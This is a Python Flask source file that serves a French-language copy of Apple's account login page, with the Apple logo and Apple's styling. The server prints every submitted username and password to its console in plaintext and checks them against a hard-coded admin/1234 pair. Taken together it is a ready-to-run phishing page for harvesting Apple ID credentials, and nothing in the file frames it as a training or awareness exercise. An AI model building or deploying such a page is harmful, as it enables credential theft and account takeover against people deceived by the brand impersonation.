from flask import Flask, request, render_template_string

app = Flask(__name__)

login_form = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Compte Apple</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            max-width: 360px;
            width: 90%;
            text-align: center;
        }
        .logo {
            width: 120px;
            margin-bottom: 30px;
        }
        h2 {
            font-weight: 600;
            font-size: 28px;
            margin: 0;
        }
        p {
            font-size: 18px;
            color: #666;
            margin-top: 5px;
            margin-bottom: 30px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            margin-bottom: 20px;
            border-radius: 10px;
            border: 1px solid #ccc;
        }
        button {
            width: 100%;
            padding: 16px;
            font-size: 20px;
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #005bb5;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
        <h2>Compte Apple</h2>
        <p>Gérer le compte Apple</p>
        <form method="POST">
            <input type="text" name="username" placeholder="E-mail ou numéro de téléphone" required><br>
            <input type="password" name="password" placeholder="Mot de passe" required><br>
            <button type="submit">→</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # RÉCUPÉRATION CÔTÉ SERVEUR
        username = request.form["username"]
        password = request.form["password"]

        # Tu peux maintenant utiliser ces valeurs comme tu veux :
        print(f"Nom d'utilisateur reçu : {username}")
        print(f"Mot de passe reçu : {password}")

        # Par exemple, vérification basique :
        if username == "admin" and password == "1234":
            return f"<h3>Bienvenue, {username} !</h3>"
        else:
            return "<h3>Identifiants incorrects</h3>"

    return render_template_string(login_form)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
